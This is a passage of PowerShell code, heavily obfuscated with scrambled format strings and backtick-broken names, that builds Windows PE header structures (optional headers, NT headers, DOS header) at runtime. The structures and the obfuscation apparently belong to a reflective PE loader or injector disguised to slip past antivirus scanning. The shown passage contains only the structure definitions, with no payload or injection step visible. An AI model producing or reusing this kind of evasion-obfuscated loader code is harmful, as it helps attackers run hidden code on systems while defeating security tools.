		(${T`ypebu`ILD`er}.("{0}{1}{2}" -f 'Defi','neFi','eld').Invoke(("{1}{3}{2}{0}"-f'mit','Si','kCom','zeOfStac'), [UInt64], ("{0}{1}" -f 'Publi','c'))).("{2}{0}{1}" -f 'f','fset','SetO').Invoke(80) | &("{1}{2}{0}" -f 'll','Ou','t-Nu')
		(${T`YPEB`UIl`DEr}.("{2}{0}{1}"-f'ineFiel','d','Def').Invoke(("{4}{1}{2}{0}{3}" -f'ap','eOf','He','Reserve','Siz'), [UInt64], ("{2}{1}{0}"-f'lic','b','Pu'))).("{2}{0}{1}"-f 'Of','fset','Set').Invoke(88) | &("{1}{2}{0}"-f'l','Out-','Nul')
		(${t`ypE`BUIldER}.("{0}{1}{2}" -f 'D','efine','Field').Invoke(("{2}{3}{1}{0}"-f'Commit','fHeap','Size','O'), [UInt64], ("{1}{0}"-f 'lic','Pub'))).("{2}{1}{0}"-f'ffset','etO','S').Invoke(96) | &("{0}{1}" -f 'Out-N','ull')
		(${tY`p`EbuIldeR}.("{2}{3}{0}{1}" -f'eFi','eld','Def','in').Invoke(("{2}{0}{3}{1}" -f 'der','lags','Loa','F'), [UInt32], ("{0}{1}" -f'Pu','blic'))).("{2}{1}{0}"-f 'ffset','etO','S').Invoke(104) | &("{0}{1}" -f'Out-Nul','l')
		(${TYpE`BU`I`LDEr}.("{0}{1}{3}{2}" -f 'Def','ine','d','Fiel').Invoke(("{5}{4}{2}{3}{0}{1}"-f 'ndSiz','es','r','OfRvaA','be','Num'), [UInt32], ("{1}{0}"-f'ic','Publ'))).("{1}{0}{2}" -f 't','Se','Offset').Invoke(108) | &("{0}{1}"-f'Out-N','ull')
		(${TYpEB`U`I`LDer}.("{0}{1}{2}{3}" -f'D','efine','Fi','eld').Invoke(("{2}{1}{0}" -f'e','tTabl','Expor'), ${im`AG`E_DatA_d`IRe`cTOrY}, ("{1}{0}" -f'lic','Pub'))).("{0}{2}{1}"-f'SetOf','et','fs').Invoke(112) | &("{1}{0}" -f'Null','Out-')
		(${Ty`p`eBuIld`eR}.("{2}{1}{0}{3}"-f 'ineFi','ef','D','eld').Invoke(("{1}{2}{3}{0}"-f'Table','I','m','port'), ${i`mAGE_dAta_D`IrEC`TO`Ry}, ("{2}{0}{1}" -f'i','c','Publ'))).("{2}{0}{1}{3}"-f'etOff','s','S','et').Invoke(120) | &("{0}{1}{2}" -f'Out-','N','ull')
		(${typ`e`BuiL`dER}.("{2}{1}{0}" -f'ld','ineFie','Def').Invoke(("{0}{1}{2}"-f'R','esourceTab','le'), ${i`mAge`_DA`T`A_diRe`CTO`RY}, ("{1}{0}"-f 'lic','Pub'))).("{1}{2}{0}" -f 'et','S','etOffs').Invoke(128) | &("{1}{0}" -f'Null','Out-')
		(${tYpe`Bui`LDeR}.("{0}{3}{1}{2}"-f 'Def','el','d','ineFi').Invoke(("{0}{1}{2}{3}"-f'Exc','epti','onTab','le'), ${I`ma`Ge_`Data_di`RecT`OrY}, ("{1}{0}"-f 'ic','Publ'))).("{2}{1}{0}" -f 'et','tOffs','Se').Invoke(136) | &("{0}{2}{1}" -f 'Ou','l','t-Nul')
		(${Ty`P`ebu`IlDER}.("{1}{0}{2}"-f 'Fiel','Define','d').Invoke(("{0}{2}{1}{3}{4}" -f'Cert','cateT','ifi','ab','le'), ${ImA`Ge_Da`TA_diREc`TO`RY}, ("{0}{1}"-f 'Publi','c'))).("{0}{1}{2}" -f'Se','t','Offset').Invoke(144) | &("{0}{1}{2}"-f 'Out','-N','ull')
		(${TYP`EbU`iLd`ER}.("{0}{2}{1}{3}" -f 'De','eF','fin','ield').Invoke(("{0}{3}{1}{4}{2}" -f 'Base','at','Table','Reloc','ion'), ${i`maGE_DaTa_`dIrECTo`RY}, ("{1}{0}" -f 'c','Publi'))).("{2}{1}{0}" -f 'fset','Of','Set').Invoke(152) | &("{0}{1}" -f'Out-','Null')
		(${ty`P`eBui`lDeR}.("{0}{2}{1}"-f 'De','neField','fi').Invoke(("{1}{0}" -f'ebug','D'), ${ImAgE`_da`TA_D`irECtORY}, ("{1}{0}"-f'blic','Pu'))).("{0}{2}{1}" -f 'Se','et','tOffs').Invoke(160) | &("{0}{1}"-f 'Out-','Null')
		(${TYpeBui`L`der}.("{1}{0}{2}"-f'F','Define','ield').Invoke(("{2}{1}{0}"-f 'cture','e','Archit'), ${i`MaGe_`D`ATA_`Dir`Ec`ToRY}, ("{2}{1}{0}" -f 'blic','u','P'))).("{1}{0}" -f 'etOffset','S').Invoke(168) | &("{2}{1}{0}" -f'ull','-N','Out')
		(${ty`pEb`UILDER}.("{0}{1}{3}{2}" -f'De','fineF','d','iel').Invoke(("{1}{0}{2}{3}"-f'lo','G','b','alPtr'), ${IM`A`gE_dAtA_`dI`RECtorY}, ("{2}{0}{1}" -f 'ubli','c','P'))).("{1}{2}{0}"-f 't','S','etOffse').Invoke(176) | &("{1}{2}{0}" -f'ull','Ou','t-N')
		(${typ`EBU`ILDER}.("{2}{0}{1}"-f 'e','Field','Defin').Invoke(("{0}{2}{1}" -f'TLST','e','abl'), ${IMAGE`_`DaT`A_D`IREc`T`OrY}, ("{0}{1}"-f 'Publ','ic'))).("{1}{0}"-f'set','SetOff').Invoke(184) | &("{1}{0}"-f 't-Null','Ou')
		(${TyPE`BUi`l`DEr}.("{1}{0}{2}{3}"-f 'F','Define','i','eld').Invoke(("{1}{0}{2}{3}"-f 'C','Load','onfigTab','le'), ${im`AGe_D`AtA`_d`IRecTory}, ("{2}{1}{0}"-f 'lic','ub','P'))).("{2}{0}{1}"-f'etOff','set','S').Invoke(192) | &("{2}{1}{0}" -f 'ull','ut-N','O')
		(${t`YpEbU`iL`DER}.("{2}{0}{3}{1}" -f'neFi','d','Defi','el').Invoke(("{2}{1}{3}{0}" -f't','I','Bound','mpor'), ${ImaGe_d`AtA`_D`Ir`EctoRY}, ("{1}{0}" -f'ublic','P'))).("{0}{1}{3}{2}"-f'Set','O','fset','f').Invoke(200) | &("{1}{0}{2}"-f 'ut-','O','Null')
		(${TYpe`BuiL`DeR}.("{2}{0}{1}{3}" -f'ne','F','Defi','ield').Invoke('IAT', ${IMaGe_Data_dI`RE`C`ToRy}, ("{0}{2}{1}"-f 'Pub','ic','l'))).("{0}{1}"-f'SetOffse','t').Invoke(208) | &("{1}{0}" -f 'l','Out-Nul')
		(${tYpebui`Ld`eR}.("{0}{2}{1}" -f 'Defi','Field','ne').Invoke(("{2}{3}{1}{4}{0}{5}" -f'p','portDe','Delay','Im','scri','tor'), ${I`MAge_daT`A_`dIrE`cT`oRY}, ("{1}{0}"-f'lic','Pub'))).("{0}{1}{2}{3}"-f'Se','tOff','s','et').Invoke(216) | &("{1}{2}{0}" -f 'l','O','ut-Nul')
		(${TY`P`ebui`ldEr}.("{0}{2}{1}" -f 'D','fineField','e').Invoke(("{3}{0}{4}{2}{5}{1}" -f'LR','r','tim','C','Run','eHeade'), ${iMa`g`E_daT`A_dirEC`TorY}, ("{0}{1}" -f 'Pub','lic'))).("{0}{2}{1}"-f'SetO','t','ffse').Invoke(224) | &("{1}{2}{0}" -f'-Null','Ou','t')
		(${ty`PE`Bui`lDer}.("{2}{0}{1}"-f 'neF','ield','Defi').Invoke(("{2}{0}{1}"-f'serv','ed','Re'), ${iMA`ge_`D`Ata_d`Ire`ctorY}, ("{1}{0}"-f'blic','Pu'))).("{0}{2}{1}" -f'Se','fset','tOf').Invoke(232) | &("{1}{2}{0}" -f 'll','O','ut-Nu')
		${i`MA`Ge`_oPt`iO`NAl_`hEader64} = ${TYPEB`U`ilDeR}.("{0}{1}{2}"-f 'Cre','ateTyp','e').Invoke()
		${WiN32T`yP`ES} | &("{1}{0}{2}" -f 'dd-M','A','ember') -MemberType ("{3}{2}{1}{0}"-f'erty','p','tePro','No') -Name ("{0}{1}{5}{2}{3}{4}" -f 'I','MAGE_O','EA','DE','R64','PTIONAL_H') -Value ${IM`A`GE_O`PtiOn`A`l_hEAd`Er64}


		${AtT`RI`BUteS} = ("{12}{11}{4}{10}{0}{8}{9}{3}{2}{5}{7}{1}{6}" -f'c, Exp','oreFieldIni','aled','t, Se','Layout, AnsiClas',', B','t','ef','li','citLayou','s, Class, Publi','uto','A')
		${t`Yp`e`BUILDER} = ${moDULeb`UIl`dEr}.("{1}{0}{2}" -f 'eTy','Defin','pe').Invoke(("{4}{2}{5}{3}{6}{0}{1}" -f'E','R32','_OPT','AL','IMAGE','ION','_HEAD'), ${attrI`B`Ut`ES}, [System.ValueType], 224)
		(${tY`pe`BuIL`DER}.("{1}{2}{0}"-f'ield','Defi','neF').Invoke(("{1}{0}"-f 'agic','M'), ${MAgI`c`TyPE}, ("{0}{2}{1}" -f 'P','ic','ubl'))).("{1}{2}{0}{3}" -f'f','Se','tO','fset').Invoke(0) | &("{1}{0}"-f'ut-Null','O')
		(${t`yp`E`BUILdER}.("{0}{3}{1}{2}" -f 'De','neFie','ld','fi').Invoke(("{3}{0}{4}{2}{1}"-f 'aj','ersion','V','M','orLinker'), [Byte], ("{0}{1}"-f'Publ','ic'))).("{0}{1}"-f'SetO','ffset').Invoke(2) | &("{2}{0}{1}" -f'-Nu','ll','Out')
		(${t`yPeBU`i`ldER}.("{0}{2}{1}"-f 'D','eField','efin').Invoke(("{0}{1}{2}{4}{3}"-f'Mi','norLinke','rVersi','n','o'), [Byte], ("{0}{1}"-f 'Publi','c'))).("{2}{1}{0}" -f't','e','SetOffs').Invoke(3) | &("{1}{0}{2}" -f'u','Out-N','ll')
		(${t`ypEbui`LDeR}.("{3}{1}{0}{2}" -f'Fi','e','eld','Defin').Invoke(("{3}{1}{2}{0}"-f 'de','O','fCo','Size'), [UInt32], ("{0}{2}{1}" -f'Pub','c','li'))).("{0}{1}{2}"-f 'SetOffs','e','t').Invoke(4) | &("{1}{0}" -f 'l','Out-Nul')
		(${t`yPE`BUiL`DeR}.("{0}{1}{3}{2}" -f'D','efineFi','ld','e').Invoke(("{2}{4}{3}{0}{1}{5}"-f 'ized','D','Size','al','OfIniti','ata'), [UInt32], ("{1}{0}"-f'blic','Pu'))).("{2}{0}{1}"-f 'f','set','SetOf').Invoke(8) | &("{1}{0}{2}" -f 'N','Out-','ull')
		(${tYp`Eb`UI`lDer}.("{2}{0}{1}"-f 'el','d','DefineFi').Invoke(("{5}{2}{6}{3}{4}{0}{1}" -f 'li','zedData','fUni','it','ia','SizeO','n'), [UInt32], ("{0}{1}{2}"-f 'Pub','li','c'))).("{0}{2}{1}"-f 'S','set','etOff').Invoke(12) | &("{0}{1}" -f 'Out-N','ull')
		(${TYPEB`U`iLDER}.("{2}{0}{3}{1}"-f'eFie','d','Defin','l').Invoke(("{5}{3}{0}{1}{4}{2}"-f 'ssOfEnt','ry','nt','e','Poi','Addr'), [UInt32], ("{1}{0}"-f'c','Publi'))).("{1}{2}{0}"-f 'set','Set','Off').Invoke(16) | &("{2}{0}{1}" -f'l','l','Out-Nu')
		(${TypE`BU`ilD`eR}.("{2}{0}{1}{3}" -f 'ne','Fi','Defi','eld').Invoke(("{1}{0}{2}"-f'C','BaseOf','ode'), [UInt32], ("{1}{0}"-f 'ublic','P'))).("{1}{0}{2}" -f 'Off','Set','set').Invoke(20) | &("{0}{1}"-f'Ou','t-Null')
		(${TYpe`BU`IlD`er}.("{3}{2}{0}{1}" -f'ineFi','eld','ef','D').Invoke(("{1}{2}{0}"-f 'fData','Base','O'), [UInt32], ("{0}{1}"-f 'Pu','blic'))).("{1}{0}{2}" -f'ff','SetO','set').Invoke(24) | &("{0}{2}{1}"-f 'Out-','ll','Nu')
		(${tYp`Ebu`iLd`eR}.("{1}{2}{0}{3}"-f 'neF','Def','i','ield').Invoke(("{0}{2}{1}"-f'Im','e','ageBas'), [UInt32], ("{0}{1}"-f 'Pu','blic'))).("{1}{2}{0}" -f'et','SetO','ffs').Invoke(28) | &("{2}{1}{0}" -f'l','Nul','Out-')
		(${TYpe`BUi`lDeR}.("{0}{2}{3}{1}"-f 'De','ield','fin','eF').Invoke(("{2}{3}{0}{1}"-f'nm','ent','Secti','onAlig'), [UInt32], ("{1}{0}" -f 'ublic','P'))).("{1}{3}{2}{0}"-f't','SetO','se','ff').Invoke(32) | &("{2}{0}{1}" -f'-N','ull','Out')
		(${TYPeb`U`i`ldER}.("{2}{0}{1}"-f 'fineFie','ld','De').Invoke(("{3}{1}{0}{2}" -f'n','nme','t','FileAlig'), [UInt32], ("{0}{1}"-f 'Publi','c'))).("{2}{0}{1}" -f't','Offset','Se').Invoke(36) | &("{2}{1}{0}"-f'ull','N','Out-')
		(${typ`E`BU`iLder}.("{0}{2}{1}{3}" -f 'Define','e','Fi','ld').Invoke(("{3}{2}{0}{1}{4}"-f 'tingSyst','emV','ra','MajorOpe','ersion'), [UInt16], ("{2}{1}{0}"-f 'lic','b','Pu'))).("{1}{0}{2}" -f 'etOffse','S','t').Invoke(40) | &("{2}{0}{1}" -f'-Nul','l','Out')
		(${ty`PEBuIl`D`er}.("{2}{0}{1}"-f 'neF','ield','Defi').Invoke(("{5}{2}{3}{4}{0}{1}"-f 'io','n','temV','e','rs','MinorOperatingSys'), [UInt16], ("{0}{2}{1}"-f 'Publ','c','i'))).("{2}{0}{1}"-f 's','et','SetOff').Invoke(42) | &("{2}{0}{1}"-f'ut-Nul','l','O')
		(${Ty`PeBui`L`DeR}.("{0}{1}{2}"-f 'D','efineFiel','d').Invoke(("{1}{2}{3}{4}{0}" -f'ion','Maj','orImag','eVe','rs'), [UInt16], ("{0}{1}"-f 'Pub','lic'))).("{2}{1}{0}"-f 't','fse','SetOf').Invoke(44) | &("{0}{2}{1}"-f'O','l','ut-Nul')
		(${tYp`EbUiL`dEr}.("{1}{0}{3}{2}" -f'fin','De','ield','eF').Invoke(("{4}{3}{0}{2}{1}"-f 'e','sion','Ver','mag','MinorI'), [UInt16], ("{0}{1}"-f 'Publi','c'))).("{1}{0}{2}" -f'tOf','Se','fset').Invoke(46) | &("{0}{1}"-f 'O','ut-Null')
		(${TY`PebuIlD`ER}.("{1}{2}{0}" -f 'd','D','efineFiel').Invoke(("{0}{3}{1}{2}"-f'Ma','temV','ersion','jorSubsys'), [UInt16], ("{2}{1}{0}" -f 'ic','bl','Pu'))).("{0}{1}"-f 'Se','tOffset').Invoke(48) | &("{1}{0}{2}"-f '-Nul','Out','l')
		(${tY`peB`UIL`DeR}.("{0}{1}{2}" -f 'Defin','eFi','eld').Invoke(("{1}{2}{3}{4}{0}"-f 'n','M','inor','S','ubsystemVersio'), [UInt16], ("{1}{0}"-f 'blic','Pu'))).("{2}{1}{0}"-f 'ffset','tO','Se').Invoke(50) | &("{0}{2}{1}"-f'Out','l','-Nul')
		(${Ty`p`eBU`ILdeR}.("{3}{1}{0}{2}"-f'ie','fineF','ld','De').Invoke(("{0}{3}{2}{1}"-f 'Win32Vers','alue','onV','i'), [UInt32], ("{1}{2}{0}" -f'ic','Pub','l'))).("{0}{2}{1}" -f'Set','fset','Of').Invoke(52) | &("{0}{1}" -f'O','ut-Null')
		(${tYpE`B`Uild`Er}.("{2}{0}{1}"-f 'f','ineField','De').Invoke(("{0}{2}{3}{1}"-f 'Size','age','O','fIm'), [UInt32], ("{0}{2}{1}"-f 'Pu','lic','b'))).("{1}{2}{0}"-f'et','Se','tOffs').Invoke(56) | &("{2}{1}{0}"-f'l','ul','Out-N')
		(${TYp`e`BuiLd`eR}.("{1}{2}{0}" -f'd','DefineFie','l').Invoke(("{2}{3}{0}{1}"-f'der','s','SizeOfH','ea'), [UInt32], ("{1}{0}" -f 'ublic','P'))).("{2}{1}{0}" -f'Offset','t','Se').Invoke(60) | &("{2}{0}{1}"-f 'ut-','Null','O')
		(${tY`p`EbUI`Lder}.("{0}{3}{1}{2}"-f 'Def','eF','ield','in').Invoke(("{1}{0}"-f 'heckSum','C'), [UInt32], ("{0}{1}" -f'Pub','lic'))).("{1}{2}{0}"-f 't','SetO','ffse').Invoke(64) | &("{2}{1}{0}"-f 'll','t-Nu','Ou')
		(${t`yPE`BuI`lDer}.("{1}{0}{2}"-f 'eF','Defin','ield').Invoke(("{0}{2}{1}"-f'Su','ystem','bs'), ${SUBSY`st`e`mty`Pe}, ("{1}{0}"-f'ublic','P'))).("{0}{1}" -f'S','etOffset').Invoke(68) | &("{0}{1}{2}" -f'Out-','N','ull')
		(${TYpEbU`I`Ld`Er}.("{1}{2}{0}"-f'd','Define','Fiel').Invoke(("{1}{0}{2}{3}" -f 'te','DllCharac','risti','cs'), ${Dl`LChA`RaC`TERiStIc`StY`pe}, ("{1}{0}" -f 'c','Publi'))).("{0}{2}{1}"-f'SetOf','t','fse').Invoke(70) | &("{1}{0}{2}"-f 'Nu','Out-','ll')
		(${TyPEB`U`ilD`er}.("{0}{2}{1}{3}" -f'Def','n','i','eField').Invoke(("{3}{4}{0}{2}{1}{5}"-f 'ack','ser','Re','SizeO','fSt','ve'), [UInt32], ("{0}{1}{2}"-f 'P','u','blic'))).("{0}{2}{1}" -f 'SetOffs','t','e').Invoke(72) | &("{1}{0}"-f't-Null','Ou')
		(${tYPebuI`l`D`ER}.("{0}{1}{3}{2}" -f 'Defin','eF','eld','i').Invoke(("{3}{4}{5}{2}{1}{0}"-f 't','Commi','fStack','S','iz','eO'), [UInt32], ("{1}{0}"-f 'ublic','P'))).("{1}{0}"-f 't','SetOffse').Invoke(76) | &("{0}{2}{1}" -f 'Out-N','l','ul')
		(${TYPeBuI`lD`er}.("{1}{3}{0}{2}" -f'ie','Def','ld','ineF').Invoke(("{4}{3}{1}{0}{2}"-f 'ser','apRe','ve','izeOfHe','S'), [UInt32], ("{1}{0}" -f'lic','Pub'))).("{0}{3}{2}{1}" -f'Se','t','ffse','tO').Invoke(80) | &("{0}{2}{1}"-f 'Out','Null','-')
		(${tYp`eBuiLD`er}.("{0}{3}{1}{2}"-f'De','ineFiel','d','f').Invoke(("{3}{2}{0}{1}"-f'eapCom','mit','zeOfH','Si'), [UInt32], ("{1}{0}" -f'ublic','P'))).("{3}{1}{2}{0}"-f't','etOff','se','S').Invoke(84) | &("{1}{2}{0}" -f'-Null','Ou','t')
		(${T`y`peBUI`ldER}.("{1}{0}{2}{3}"-f 'eFi','Defin','e','ld').Invoke(("{2}{1}{0}"-f 'erFlags','d','Loa'), [UInt32], ("{1}{0}"-f 'blic','Pu'))).("{2}{0}{1}" -f 'ffse','t','SetO').Invoke(88) | &("{0}{1}{2}"-f 'Ou','t-','Null')
		(${t`y`P`eBuilDEr}.("{0}{1}{2}" -f'Def','ineF','ield').Invoke(("{4}{3}{2}{5}{0}{1}"-f'ize','s','OfRvaAnd','umber','N','S'), [UInt32], ("{0}{1}"-f 'P','ublic'))).("{2}{1}{0}" -f 'ffset','tO','Se').Invoke(92) | &("{2}{0}{1}"-f'Nu','ll','Out-')
		(${TYpe`B`UI`ldEr}.("{2}{3}{1}{0}"-f'd','eFiel','Defi','n').Invoke(("{2}{0}{1}"-f 'r','tTable','Expo'), ${Ima`GE_D`A`TA_dirEC`ToRY}, ("{0}{2}{1}"-f'P','ic','ubl'))).("{2}{0}{1}"-f'et','Offset','S').Invoke(96) | &("{0}{1}"-f'O','ut-Null')
		(${t`YPE`Build`ER}.("{0}{1}{2}{3}" -f 'Defin','eFi','e','ld').Invoke(("{0}{1}{2}" -f 'Imp','ort','Table'), ${iMAGE_Da`Ta`_D`iR`eCTorY}, ("{1}{0}"-f 'lic','Pub'))).("{1}{0}{2}" -f'etOffs','S','et').Invoke(104) | &("{0}{1}"-f 'Out-','Null')
		(${TyPEB`UILD`ER}.("{1}{0}{2}"-f'neFi','Defi','eld').Invoke(("{1}{0}{2}{3}" -f'urceTa','Reso','b','le'), ${ima`Ge`_daT`A_d`IRE`CT`ORY}, ("{1}{0}" -f 'c','Publi'))).("{1}{0}{2}"-f 'se','SetOff','t').Invoke(112) | &("{1}{0}{2}" -f 't-Nul','Ou','l')
		(${T`Y`P`eBUILDER}.("{3}{2}{1}{0}" -f'ield','eF','n','Defi').Invoke(("{2}{1}{4}{3}{0}"-f'e','ce','Ex','bl','ptionTa'), ${Im`AgE_d`A`Ta_diRecTo`Ry}, ("{0}{1}" -f'Pu','blic'))).("{1}{2}{3}{0}" -f'fset','Set','O','f').Invoke(120) | &("{0}{2}{1}" -f 'Out-N','ll','u')
		(${T`yPEBuI`L`dER}.("{0}{2}{1}"-f'Def','eField','in').Invoke(("{3}{0}{2}{1}"-f 'rtific','eTable','at','Ce'), ${I`M`AGe_datA_dIReC`TO`Ry}, ("{0}{1}{2}"-f 'Publ','i','c'))).("{2}{3}{1}{0}"-f 't','Offse','S','et').Invoke(128) | &("{1}{2}{0}" -f't-Null','O','u')
		(${t`Y`pEBUil`dEr}.("{2}{1}{0}"-f'd','eFiel','Defin').Invoke(("{2}{0}{1}{5}{4}{3}"-f'oca','tionTa','BaseRel','e','l','b'), ${I`M`Age_DaT`A_dIREc`TO`RY}, ("{2}{0}{1}" -f 'ubli','c','P'))).("{2}{1}{0}" -f 'Offset','et','S').Invoke(136) | &("{0}{1}{2}"-f'Ou','t','-Null')
		(${ty`pEBUilD`er}.("{1}{2}{0}"-f'neField','De','fi').Invoke(("{1}{0}" -f'ebug','D'), ${iMAge_Data_`dIrE`C`TO`RY}, ("{0}{1}" -f 'P','ublic'))).("{2}{1}{0}"-f 'et','etOffs','S').Invoke(144) | &("{0}{1}" -f 'Out','-Null')
		(${T`YPe`BuIldeR}.("{1}{0}{2}" -f'efineFie','D','ld').Invoke(("{1}{0}{2}" -f 'rchitec','A','ture'), ${imaG`E_`dATA_dire`C`TORY}, ("{0}{1}" -f'Publ','ic'))).("{1}{0}" -f 'etOffset','S').Invoke(152) | &("{0}{1}" -f 'Ou','t-Null')
		(${TyP`E`B`UildEr}.("{2}{0}{1}{3}" -f'efin','eF','D','ield').Invoke(("{0}{1}{2}" -f 'Gl','obalPt','r'), ${IMaGE_daTA`_DI`R`ECTo`RY}, ("{1}{0}"-f 'lic','Pub'))).("{3}{0}{1}{2}"-f'et','O','ffset','S').Invoke(160) | &("{1}{0}" -f '-Null','Out')
		(${T`Yp`E`BUIlDer}.("{2}{0}{1}" -f'neFiel','d','Defi').Invoke(("{2}{1}{0}"-f'e','l','TLSTab'), ${ima`GE_d`AtA_`DirECT`Ory}, ("{1}{0}" -f 'blic','Pu'))).("{2}{0}{1}" -f'tOff','set','Se').Invoke(168) | &("{0}{1}"-f'Out-','Null')
		(${T`yP`EBuIld`eR}.("{1}{3}{0}{2}" -f 'eFiel','De','d','fin').Invoke(("{2}{1}{0}" -f'e','dConfigTabl','Loa'), ${iMage_dAT`A_d`IR`ECTORy}, ("{0}{1}"-f'Pub','lic'))).("{0}{1}{2}{3}" -f'Se','t','Off','set').Invoke(176) | &("{1}{2}{0}"-f 'll','Out-','Nu')
		(${Ty`PE`B`UILder}.("{0}{1}{2}"-f 'D','ef','ineField').Invoke(("{0}{2}{1}{3}" -f 'Bo','dI','un','mport'), ${iMa`gE_dA`TA_Di`Re`CTOry}, ("{1}{0}" -f 'c','Publi'))).("{2}{0}{1}" -f 'ff','set','SetO').Invoke(184) | &("{0}{1}" -f 'Ou','t-Null')
		(${tYPE`BuIL`D`eR}.("{0}{3}{2}{1}" -f'Def','d','el','ineFi').Invoke('IAT', ${iMA`ge_daTa_dIr`EC`TOrY}, ("{2}{1}{0}" -f'ic','ubl','P'))).("{2}{1}{0}"-f'fset','f','SetO').Invoke(192) | &("{2}{0}{1}" -f '-N','ull','Out')
		(${T`y`pEbuIL`dER}.("{0}{2}{1}"-f 'D','ineField','ef').Invoke(("{0}{4}{1}{2}{3}{5}{6}"-f 'D','m','portDesc','ri','elayI','p','tor'), ${iMagE_`dAT`A_`Dir`E`cTory}, ("{1}{0}" -f 'lic','Pub'))).("{2}{0}{1}"-f'etO','ffset','S').Invoke(200) | &("{0}{1}{2}" -f'Out','-','Null')
		(${tyPe`BU`iLd`er}.("{1}{3}{2}{0}" -f 'Field','D','fine','e').Invoke(("{2}{1}{4}{3}{0}" -f 'er','me','CLRRunti','ad','He'), ${ImaGE`_Data_D`i`RE`CTOrY}, ("{1}{0}"-f'ic','Publ'))).("{2}{0}{1}"-f 'tO','ffset','Se').Invoke(208) | &("{0}{1}" -f 'Ou','t-Null')
		(${t`ypEB`UIlDer}.("{0}{1}{2}" -f 'Defi','neFie','ld').Invoke(("{2}{1}{0}"-f'd','ve','Reser'), ${iMAGE_`DaTA_d`ir`Ectory}, ("{0}{1}" -f 'Pu','blic'))).("{0}{1}"-f 'S','etOffset').Invoke(216) | &("{0}{1}{2}" -f 'Out','-','Null')
		${imAGE_OPTiOn`A`L`_`HeAD`Er32} = ${typ`EbU`IlDER}.("{1}{2}{0}"-f 'pe','Create','Ty').Invoke()
		${w`in32`TypEs} | &("{0}{3}{1}{2}" -f'Ad','-Memb','er','d') -MemberType ("{0}{1}{2}"-f'N','otePro','perty') -Name ("{2}{3}{0}{4}{5}{1}"-f'O','ER32','IMA','GE_OPTI','NAL_HEA','D') -Value ${im`AGe`_oPtI`ONA`L`_HEAdeR32}


		${AtT`RI`BuTES} = ("{20}{14}{11}{0}{22}{3}{1}{6}{15}{5}{18}{7}{10}{19}{12}{2}{21}{4}{8}{9}{17}{16}{13}"-f 's, ','lic','al','lass, Pub',', ','e',',','en','Be','foreFi','tial','out, AnsiClas',' Se','nit','ay',' S','dI','el','qu','Layout,','AutoL','ed','C')
		${t`ypEBuiLD`er} = ${MODU`LebU`ildER}.("{1}{2}{0}"-f 'Type','De','fine').Invoke(("{3}{1}{2}{0}" -f '64','_NT_H','EADERS','IMAGE'), ${AtTR`Ib`U`TES}, [System.ValueType], 264)
		${ty`P`EBUi`lDEr}.("{1}{2}{0}{3}" -f 'fine','D','e','Field').Invoke(("{0}{2}{1}" -f'Signat','re','u'), [UInt32], ("{0}{1}"-f 'Publ','ic')) | &("{0}{2}{1}" -f 'Out','Null','-')
		${typE`BuIl`deR}.("{0}{2}{1}" -f 'De','eField','fin').Invoke(("{0}{2}{1}"-f'F','r','ileHeade'), ${imAGe`_fiLE_HEA`d`er}, ("{0}{1}"-f'Pub','lic')) | &("{0}{1}{2}" -f 'Out','-N','ull')
		${tYPEbui`L`deR}.("{0}{1}{2}" -f 'D','efin','eField').Invoke(("{3}{1}{0}{2}" -f'tionalH','p','eader','O'), ${IMAgE_`oPtIOn`A`L_heAdeR`64}, ("{1}{0}"-f'ic','Publ')) | &("{0}{2}{1}"-f 'Out-','ull','N')
		${IMA`ge_N`T_`H`EAdE`Rs64} = ${Ty`pE`Bui`ldEr}.("{2}{3}{0}{1}"-f'y','pe','Creat','eT').Invoke()
		${WiN`3`2TYpeS} | &("{1}{2}{0}" -f'r','Ad','d-Membe') -MemberType ("{3}{1}{2}{0}" -f'erty','ot','eProp','N') -Name ("{1}{5}{0}{2}{3}{4}"-f'GE','IM','_NT','_H','EADERS64','A') -Value ${I`M`A`Ge_NT_HeaD`er`s64}
		

		${A`TTr`ibu`TEs} = ("{0}{9}{5}{8}{3}{10}{12}{6}{1}{4}{7}{2}{11}" -f 'Au','t, Seal','Field',' Class,','ed,','ut, Ansi','ayou',' Before','Class,','toLayo',' Public, Sequentia','Init','lL')
		${tYpE`BUiLD`ER} = ${Mo`Du`LEBuI`LdER}.("{1}{0}{2}" -f 'fineTy','De','pe').Invoke(("{0}{1}{3}{2}" -f 'IMAGE_NT_','HE','2','ADERS3'), ${AtTR`iBu`T`eS}, [System.ValueType], 248)
		${TYP`EbUiL`DeR}.("{0}{1}{2}"-f'D','ef','ineField').Invoke(("{0}{1}{2}"-f'Sign','a','ture'), [UInt32], ("{1}{0}" -f'blic','Pu')) | &("{0}{1}{2}"-f'O','ut','-Null')
		${Ty`pEB`UiLder}.("{2}{1}{0}{3}"-f'neFiel','fi','De','d').Invoke(("{2}{1}{0}{3}" -f 'ad','He','File','er'), ${iM`AGE_file`_HEAd`eR}, ("{1}{0}"-f'ublic','P')) | &("{0}{1}"-f 'Out-N','ull')
		${TYpe`BUiL`der}.("{2}{0}{1}{3}"-f 'in','eFi','Def','eld').Invoke(("{2}{4}{1}{3}{0}"-f'der','lHe','Opti','a','ona'), ${i`M`AGe_o`PtI`o`NAL`_HeaDER32}, ("{1}{0}" -f'lic','Pub')) | &("{2}{1}{0}"-f'll','ut-Nu','O')
		${ImagE_N`T`_HeaDe`Rs`32} = ${t`YpEBUil`dER}.("{2}{0}{1}"-f'ateT','ype','Cre').Invoke()
		${W`IN32T`YPeS} | &("{1}{0}{2}"-f 'b','Add-Mem','er') -MemberType ("{2}{1}{3}{0}"-f 'rty','teProp','No','e') -Name ("{3}{0}{1}{2}" -f'_NT_HE','AD','ERS32','IMAGE') -Value ${Im`AgE_nT_h`eADer`s32}


		${AttR`iBu`TeS} = ("{2}{15}{4}{9}{21}{10}{12}{1}{0}{14}{20}{19}{8}{6}{18}{13}{11}{16}{7}{3}{17}{5}"-f 'as','s, Cl','Au','Bef','oLayout, ','eFieldInit',' ',' ','blic,','An','i',', S','Clas','out','s, ','t','ealed,','or','SequentialLay','u','P','s')
		${typEbU`iL`DEr} = ${MO`DU`LE`BuIldEr}.("{0}{3}{1}{2}"-f'Def','T','ype','ine').Invoke(("{3}{1}{2}{0}" -f 'R','DOS','_HEADE','IMAGE_'), ${AttRiB`U`TeS}, [System.ValueType], 64)
		${T`yPeb`Ui`ldEr}.("{0}{1}{2}"-f'Defi','neF','ield').Invoke(("{0}{1}"-f 'e_','magic'), [UInt16], ("{0}{1}" -f 'Pu','blic')) | &("{1}{0}" -f 'l','Out-Nul')
